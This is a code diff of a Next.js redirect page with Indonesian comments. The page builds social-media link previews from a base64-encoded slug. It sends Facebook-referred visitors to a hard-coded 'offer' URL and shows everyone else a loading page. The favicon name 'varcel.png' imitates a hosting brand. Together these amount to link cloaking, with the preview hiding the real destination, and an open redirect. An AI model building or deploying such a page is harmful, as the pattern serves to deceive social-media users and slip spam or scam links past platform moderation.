@@ -9,22 +9,28 @@ interface Props {
   title: string;
 }
 
-const offerUrl = "https://example.com/offer"; // ✅ Ganti dengan offer kamu
+// Ganti ini dengan link tujuan jika user datang dari Facebook
+const offerUrl = "https://example.com/offer";
+
 export const getServerSideProps: GetServerSideProps = async (context) => {
   const slugParts = context.params?.slug || [];
+  const encoded = Array.isArray(slugParts) ? slugParts.join("") : slugParts;
   const fbclid = context.query.fbclid;
-  const referringURL = context.req.headers.referer || "";
+  const referer = context.req.headers.referer || "";
 
   if (!encoded) return { notFound: true };
 
   try {
     const decoded = Buffer.from(encoded, "base64").toString("utf-8");
-    const { redirectUrl, imageUrl, title } = JSON.parse(decoded);
+    const data = JSON.parse(decoded);
+    const { redirectUrl, imageUrl, title } = data;
 
-    if (!redirectUrl || !imageUrl) throw new Error("Invalid data");
+    if (!redirectUrl || !imageUrl) {
+      throw new Error("Invalid redirect data.");
+    }
 
-    // 🔁 Redirect langsung jika dari Facebook
-    if (referringURL.includes("facebook.com") || fbclid) {
+    // Redirect langsung jika dari Facebook (atau fbclid terdeteksi)
+    if (referer.includes("facebook.com") || fbclid) {
       return {
         redirect: {
           destination: offerUrl,
@@ -33,7 +39,7 @@ export const getServerSideProps: GetServerSideProps = async (context) => {
       };
     }
 
-    // ✅ Tampilkan halaman loading
+    // Tampilkan halaman loading sementara
     return {
       props: {
         redirectUrl,
@@ -64,20 +70,17 @@ export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
         <meta property="og:type" content="website" />
         {imageUrl && <meta property="og:image" content={imageUrl} />}
         <link rel="icon" href="/varcel.png" type="image/x-icon" />
-        <style>
-          {`
-            @keyframes spin {
-              0% { transform: rotate(0deg); }
-              100% { transform: rotate(360deg); }
-            }
-          `}
-        </style>
+        <style>{`
+          @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+          }
+        `}</style>
       </Head>
 
       <main style={styles.container}>
         <div style={styles.loader}></div>
         <div style={styles.loadingText}>Please wait...</div>
-        {/* Gambar tersembunyi untuk preload dan social preview */}
         {imageUrl && (
           <img
             src={imageUrl}
@@ -102,6 +105,8 @@ const styles: { [key: string]: React.CSSProperties } = {
     background: "linear-gradient(135deg, #f9f9f9 0%, #e0e0e0 100%)",
     color: "#333",
     fontFamily: "sans-serif",
+    padding: "1rem",
+    textAlign: "center",
   },
   loader: {
     width: 64,
